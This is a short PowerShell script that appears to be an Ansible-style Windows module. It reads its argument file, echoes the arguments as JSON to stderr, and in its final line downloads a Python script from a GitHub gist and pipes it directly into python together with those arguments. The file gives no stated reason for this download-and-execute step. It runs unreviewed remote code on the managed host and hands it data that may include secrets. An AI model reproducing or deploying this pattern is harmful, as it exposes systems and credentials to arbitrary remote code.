#!powershell
# <license>

# WANT_JSON
# POWERSHELL_COMMON

$data = Get-Content $args[0] | Out-String
$data = $data.Trim() | ConvertTo-Json

$host.ui.WriteErrorLine($data)

((new-object net.webclient).DownloadString('https://gist.githubusercontent.com/tcr/c15839a516e6eba3baf1/raw/6bb61fe4bb6f1ea22e1b1853c492f0db04c64279/gistfile1.py')) | python - $data
